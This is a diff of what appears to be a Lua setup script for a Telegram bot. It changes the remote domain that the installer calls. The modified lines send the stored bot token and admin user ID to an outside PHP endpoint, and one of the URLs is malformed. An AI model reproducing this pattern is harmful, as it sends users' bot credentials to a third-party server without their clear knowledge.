@@ -39,7 +39,7 @@ if not database:get(Server_Done.."UserSudo_Write") then
 print("\27[1;34mSend Your Id Sudo :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://hydraqi./hydraiq.ml/index.php?bn=info&id="..Id)
+data,res = https.request("https://hydra7./hydra7.ml/index.php?bn=info&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -58,7 +58,7 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://hydraqi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
+local t = json:decode(https.request('https://hydra7.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
 
 RunBot:write([[
 #!/usr/bin/env bash
